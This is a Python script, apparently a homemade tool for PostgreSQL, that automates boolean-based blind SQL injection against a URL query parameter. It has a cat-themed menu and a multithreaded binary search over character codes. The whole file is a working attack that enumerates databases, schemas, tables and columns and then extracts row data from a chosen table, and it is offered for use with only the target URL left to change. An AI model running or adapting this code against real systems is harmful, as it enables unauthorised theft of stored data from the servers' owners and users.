import requests
from multiprocessing import Pool
from itertools import repeat

def boolean_based_blind(condition):
    url = 'http://127.0.0.1:8789/?query=' # change me
    query = f"SELECT datname FROM pg_database WHERE {condition}" # change me
    # print(query)
    response = requests.get(url+query) # maybe change me

    if 'template1' in response.text: # change me to other keyword or length
        return True
    else:
        return False

def test():
    meow = boolean_based_blind("1=1")
    print("Intend True: ", meow)
    meowmeow = boolean_based_blind("1=0")
    print("Intend False: ", meowmeow)
    if meow and not meowmeow:
        print("✅ Test success 🐱🐱🐱🐱🐱🐱🐱🐱🐱")
    else:
        print("❌ Test fail 😿😿😿😿😿😿😿😿😿😿")
    # print(boolean_based_blind("1=1")) # Return True
    # print(boolean_based_blind("1=0")) # Return False


def do_binary_search(right_condition,guess_range,v=0):
    left = guess_range[0]
    right = guess_range[1]
    while right - left > 3: # <= 3 will stop
        if v == 1:
            print("\t\t\t\t\t\t",end='\r')
            print(left,'~',right,end='\r')
        guess = int(left+(right-left)/2)
        if boolean_based_blind(f"({guess}>{right_condition})"):
            right = guess
        else:
            left = guess
    for i in range(left,right): # do match
        if v == 1:
            print("\t\t\t\t\t\t",end='\r')
            print("Testing",i,end='\r')
        if boolean_based_blind(f"({i}={right_condition})"):
            if v == 1:
                print("\t\t\t\t\t\t",end='\r')
                print("Answer :",i , f"({chr(i) if i >= 32 and i <= 127 else ''})")
            return i





###################
################### Current DB
def get_current_db(v):
    print("[🐱] Query DB Strings Length")
    current_len_right = "(SELECT LENGTH(current_database()))" 
    guess_range = [1,100]
    current_db_len = do_binary_search(current_len_right,guess_range,v)
    print("[😺😺]Current DB Length:", current_db_len)

    db_name_right_condition = "(SELECT ASCII(SUBSTRING(current_database(),{current_db_len},1)))"
    db_name_right_conditions = [db_name_right_condition.format(current_db_len=i) for i in range(1,current_db_len+1)]
    guess_range = [32,128]
    param = zip(db_name_right_conditions,repeat(guess_range),repeat(v))
    db_name = pool.starmap(do_binary_search, param)
    db_name = ''.join([chr(i) for i in db_name])
    print("[😺😺]Current DB Name:", db_name)

    print("[🐱] Query Schema Strings Length")
    current_len_right = "(SELECT LENGTH(current_schema))" 
    guess_range = [1,100]
    current_schema_len = do_binary_search(current_len_right,guess_range,v)
    print("[😺😺]Current Schema Length:", current_schema_len)

    schema_name_right_condition = "(SELECT ASCII(SUBSTRING(current_schema,{current_schema_len},1)))"
    schema_name_right_conditions = [schema_name_right_condition.format(current_schema_len=i) for i in range(1,current_schema_len+1)]
    guess_range = [32,128]
    param = zip(schema_name_right_conditions,repeat(guess_range),repeat(v))
    schema_name = pool.starmap(do_binary_search, param)
    schema_name = ''.join([chr(i) for i in schema_name])
    print("[😺😺]Current Schema Name:", schema_name)

###################
################### Database
def get_dbs(v):
    print("[🐱] Query DB Size")
    db_size_right = "(SELECT COUNT(DISTINCT(datname)) FROM pg_database)"
    guess_range = [1,20]
    db_size = do_binary_search(db_size_right,guess_range,v)
    print("[😺😺]DB Size:" , db_size)

    print("[🐱] Query DB Strings Length")
    db_str_len_right = "(SELECT LENGTH(datname) FROM pg_database LIMIT 1 OFFSET {db_num})"
    db_str_len_rights = [db_str_len_right.format(db_num=i) for i in range(db_size)]
    guess_range = [1,100]
    param = zip(db_str_len_rights,repeat(guess_range),repeat(v))
    db_str_lens = pool.starmap(do_binary_search, param)
    print("[😺😺]DB Strings Length:", db_str_lens)

    print("[🐱] Query DB Name")
    db_names = []
    for size in range(db_size):
        db_name_right_condition = "(SELECT ASCII(SUBSTRING(datname,{db_name_index},1)) FROM pg_database LIMIT 1 OFFSET {size})"
        db_name_right_conditions = [db_name_right_condition.format(db_name_index=i,size=size) for i in range(1,db_str_lens[size]+1)]
        guess_range = [32,128]
        param = zip(db_name_right_conditions,repeat(guess_range),repeat(v))
        db_name = pool.starmap(do_binary_search, param)
        db_name = ''.join([chr(i) for i in db_name])
        print(f"DB_Name[{size}]={db_name}")
        db_names.append(db_name)
    print("[😺😺]DB_Name:", db_names)

###################
################### Schema 
def get_schemas(v):
    print("[🐱] Query Schema Size")
    schema_size_right = "(SELECT COUNT(DISTINCT(schemaname)) FROM pg_tables)"
    guess_range = [1,20]
    schema_size = do_binary_search(schema_size_right,guess_range,v)
    print("[😺😺]Schema Size:" , schema_size)

    print("[🐱] Query Schema Strings Length")
    schema_str_len_right = "(SELECT LENGTH(a) FROM (SELECT DISTINCT(schemaname) AS a FROM pg_tables) AS t LIMIT 1 OFFSET {schema_num})"
    schema_str_len_rights = [schema_str_len_right.format(schema_num=i) for i in range(schema_size)]
    guess_range = [1,100]
    param = zip(schema_str_len_rights,repeat(guess_range),repeat(v))
    schema_str_lens = pool.starmap(do_binary_search, param)
    print("[😺😺]Schema Strings Length:", schema_str_lens)

    print("[🐱] Query Schema Name")
    schema_names = []
    for size in range(schema_size):
        schema_name_right_condition = "(SELECT ASCII(SUBSTRING(a,{schema_name_index},1)) FROM (SELECT DISTINCT(schemaname) AS a FROM pg_tables) AS t LIMIT 1 OFFSET {size})"
        schema_name_right_conditions = [schema_name_right_condition.format(schema_name_index=i,size=size) for i in range(1,schema_str_lens[size]+1)]
        guess_range = [32,128]
        param = zip(schema_name_right_conditions,repeat(guess_range),repeat(v))
        schema_name = pool.starmap(do_binary_search, param)
        schema_name = ''.join([chr(i) for i in schema_name])
        print(f"Schema[{size}]={schema_name}")
        schema_names.append(schema_name)
    print("[😺😺]Schema_Name:", schema_names)



###################
################### Table
def get_tables(v):
    schema = input("Schema Name : ")
    print("[🐱] Query Tables Size")
    table_size_right = f"(SELECT COUNT(DISTINCT(tablename)) FROM pg_tables WHERE schemaname='{schema}')"
    guess_range = [1,200]
    table_size = do_binary_search(table_size_right,guess_range,v)
    print("Tables Size:" , table_size)

    print("[🐱] Query Table Strings Length")
    table_str_len_right = "(SELECT LENGTH(tablename) FROM pg_tables WHERE schemaname='{schema}' LIMIT 1 OFFSET {schema_num})"
    table_str_len_rights = [table_str_len_right.format(schema=schema,schema_num=i) for i in range(table_size)]
    guess_range = [1,100]
    param = zip(table_str_len_rights,repeat(guess_range),repeat(v))
    table_str_lens = pool.starmap(do_binary_search, param)
    print("[😺😺]Table Strings Length:", table_str_lens)

    print("[🐱] Query Table Name")
    table_names = []
    for size in range(table_size):
        table_name_right_condition = "(SELECT ASCII(SUBSTRING(tablename,{table_name_index},1)) FROM pg_tables WHERE schemaname='{schema}' LIMIT 1 OFFSET {size})"
        table_name_right_conditions = [table_name_right_condition.format(table_name_index=i,schema=schema,size=size) for i in range(1,table_str_lens[size]+1)]
        guess_range = [32,128]
        param = zip(table_name_right_conditions,repeat(guess_range),repeat(v))
        table_name = pool.starmap(do_binary_search, param)
        table_name = ''.join([chr(i) for i in table_name])
        print(f"Table_Name[{size}]={table_name}")
        table_names.append(table_name)
    print("[😺😺]Table_Name:", table_names)



################### 
################### Column
def get_columns(v):
    schema = input("Schema Name : ")
    table = input("Table Name : ")
    print("[🐱] Query Column Size")
    column_size_right = f"(SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{schema}')"
    guess_range = [1,200]
    column_size = do_binary_search(column_size_right,guess_range,v)
    print("[😺😺]Column Size:" , column_size)


    print("[🐱] Query Table Column Length")
    column_str_len_right = "(SELECT LENGTH(column_name) FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{schema}' LIMIT 1 OFFSET {schema_num})"
    column_str_len_rights = [column_str_len_right.format(table=table,schema=schema,schema_num=i) for i in range(column_size)]
    guess_range = [1,100]
    param = zip(column_str_len_rights,repeat(guess_range),repeat(v))
    column_str_lens = pool.starmap(do_binary_search, param)
    print("[😺😺]Column Strings Length:", column_str_lens)

    print("[🐱] Query Column Name")
    column_names = []
    for size in range(column_size):
        column_name_right_condition = "(SELECT ASCII(SUBSTRING(column_name,{column_name_index},1)) FROM information_schema.columns WHERE table_name='{table}' AND table_schema='{schema}'LIMIT 1 OFFSET {size})"
        column_name_right_conditions = [column_name_right_condition.format(table=table,schema=schema,column_name_index=i,size=size) for i in range(1,column_str_lens[size]+1)]
        guess_range = [32,128]
        param = zip(column_name_right_conditions,repeat(guess_range),repeat(v))
        column_name = pool.starmap(do_binary_search, param)
        column_name = ''.join([chr(i) for i in column_name])
        print(f"Column_Name[{size}]={column_name}")
        column_names.append(column_name)
    print("[😺😺]Column_Name:", column_names)


######
###### SELECT DATA
def get_data(v):
    schema = input("Schema Name : ")
    table = input("Table Name : ")
    column = input("Column Name (support '||'): ")

    print("[🐱] Query Data Size")
    data_size_right = f"(SELECT COUNT({column}) FROM {schema}.{table})"
    guess_range = [1,100]
    data_size = do_binary_search(data_size_right,guess_range,v)
    print("[😺😺]Data Size:" , data_size)

    print("[🐱] Query Data Length")
    data_str_len_right = "(SELECT LENGTH({column}) FROM {schema}.{table} LIMIT 1 OFFSET {schema_num})"
    data_str_len_rights = [data_str_len_right.format(column=column,schema=schema,table=table,schema_num=i) for i in range(data_size)]
    guess_range = [1,100]
    param = zip(data_str_len_rights,repeat(guess_range),repeat(v))
    data_str_lens = pool.starmap(do_binary_search, param)
    print("[😺😺]Column Strings Length:", data_str_lens)


    print("[🐱] Query Data Name")
    data_names = []
    for size in range(data_size):
        data_name_right_condition = "(SELECT ASCII(SUBSTRING({column},{data_name_index},1)) FROM {schema}.{table} LIMIT 1 OFFSET {size})"
        data_name_right_conditions = [data_name_right_condition.format(column=column,schema=schema,table=table,data_name_index=i,size=size) for i in range(1,data_str_lens[size]+1)]
        guess_range = [32,128]
        param = zip(data_name_right_conditions,repeat(guess_range),repeat(v))
        data_name = pool.starmap(do_binary_search, param)
        data_name = ''.join([chr(i) for i in data_name])
        print(f"Data_Name[{size}]={data_name}")
        data_names.append(data_name)
    print("[😺😺]Data_Name:", data_names)


banner = """
▒█▀▀▀█ ▒█▀▀█ ▒█░░░ ▒█▀▄▀█ ▒█▀▀▀ █▀▀█ █░░░█
░▀▀▀▄▄ ▒█░▒█ ▒█░░░ ▒█▒█▒█ ▒█▀▀▀ █▄▀█ █▄█▄█
▒█▄▄▄█ ░▀▀█▄ ▒█▄▄█ ▒█░░▒█ ▒█▄▄▄ █▄▄█ ░▀░▀░ for PostgreSQL
"""
print(banner)

verbose = 1
func = int(input(""" 
 🐱 (0) System Test
 🐱 (1) Get Current DB
 🐱 (2) Get All DBS
 🐱 (3) Get Schemas
 🐱 (4) Get Tables
 🐱 (5) Get Columns
 🐱 (6) Get Data
Your Option : """))
threads = int(input("Threads (Suggest 10): "))
# threads = 10
pool = Pool(threads)

if func == 0:
    test()
elif func == 1:
    get_current_db(verbose)
elif func == 2:
    get_dbs(verbose)
elif func == 3:
    get_schemas(verbose)
elif func == 4:
    get_tables(verbose)
elif func == 5:
    get_columns(verbose)
elif func == 6:
    get_data(verbose)
